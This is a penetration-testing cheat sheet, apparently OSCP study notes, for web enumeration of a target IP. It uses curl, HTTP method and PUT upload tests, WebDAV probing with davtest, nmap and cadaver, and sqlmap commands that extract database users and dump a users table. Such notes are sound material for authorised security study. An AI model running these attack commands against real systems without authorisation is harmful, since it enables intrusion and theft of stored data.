# Web Enumeration [ 80 / 443 ]

Set Temporary Variables

```sh
ip=<VictimIP>
```

## Reconnaissance

```sh
curl $ip -s -L | html2text -width '99' | uniq > curl_html2text_uniq.txt
```

### Links Extraction

```sh
curl $ip -s -L > curl_RAW.txt
cat 08.02_curl_-s_-L_RAW.txt | grep -oE 'http.*"'
```

### Checking headers

```sh
curl -i $ip > curl_-i.txt
```

## Testing HTTP methods

> NOTE: You can use BurpSuite as a proxy on the request using the --proxy argument of the curl command

```sh
curl -X OPTIONS -v http://$ip 2> curl_OPTIONS_-v.txt
```

### Trying to upload a file if PUT is allowed

```sh
echo "test" > test.txt
curl --upload-file test.txt -v --url https://$ip/test.txt > curl_--upload-file.txt
```

## WebDAV enumeration and vulnerabilities

```sh
davtest [-auth $user:$pass] [-cleanup] -url http://$ip > davtest_-cleanup.txt
```
```sh
davtest [-auth $user:$pass] -rand evilhacker -url http://$ip > davtest_-rand.txt
```
```sh
nmap $ip -p80,8080 --script http-webdav-scan -oN nmap_-p80_8080_--script_http-webdav-scan.nmap
```
```sh
nmap $ip -n -Pn -p80 --script=http-iis-webdav-vuln -oN nmap_-p80_--script_http-iis-webdav-vuln.nmap
```
```sh
nmap $ip -n -Pn -p80 --script=http-iis-short-name-brute.nse -oN nmap_-p80_--script_http-iis-short-name-brute.nmap
```

### Cadaver Connection

```sh
cadaver http://$ip/
```

#### Cadaver Common commands

```sh
dav:/> ? 				← Verify commands that can be executed
dav:/> put archivo.ext 	← Upload file to server
```


## Domain Enumeration

### Find website blocker

e.g: Change the value of "Host:" flag in a GET request for "test", to find the domain name of who is blocking

[Initial Request]  
![Initial Request](../../.gitbook/assets/images/initial_request.png)

[Modified Request]  
![Modified Request](../../.gitbook/assets/images/modified_request.png)

[Domain Name]  
![Domain Name](../../.gitbook/assets/images/domain_name.png)

Change the value of "Host:" flag in a GET request with the Domain Name of who is blocking us "pi.hole"  
![Change Flag](../../.gitbook/assets/images/change_flag.png)

## Interesting discovered pages



# Inyecciones SQL con SQLMAP

1. Locate a form field, login or similar that can query the server's SQL database.
2. Test if it is susceptible to a SQLi of any type (Error Based, Blind SQL injection Time Based, etc.)

## Quick test
insert a single quotation mark (') in the field and observe the response, if it is an error it is susceptible

## Resources
[Quick Tests](Tools.ctb>Exploitation>Web>QuickTests)
[SQL injection](Tools.ctb>Exploitation>Web>SQLinjection)


# NO IN OSCP!!! --> SQL Injections With SQLMAP

## Injection en GET

```sh
sqlmap -u  "http://$ip/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p "add_value"
```

Where:
* <mark style="color:orange;">--current-user</mark> user of the database
* <mark style="color:orange;">--current-db</mark> database in use
* <mark style="color:orange;">-D jabcd0cs --tables</mark> database tables

## Technique for Passing Data When it is a POST Method on a Formulari

ref: https://hackertarget.com/sqlmap-post-request-injection/

Through burp we capture the login attempt, copy the generated POST and save it to a file [post-data.txt], and we passed that file to sqlmap

```sh
sqlmap -r post-data.txt --current-user
```

Another option is
```sh
sqlmap -u "full-form-router" --forms --dbs
```

## Dump Data From a Table

```sh
sqlmap -u "http://$ip/section.php?id=51" --dump -D safecosmetics -T users
```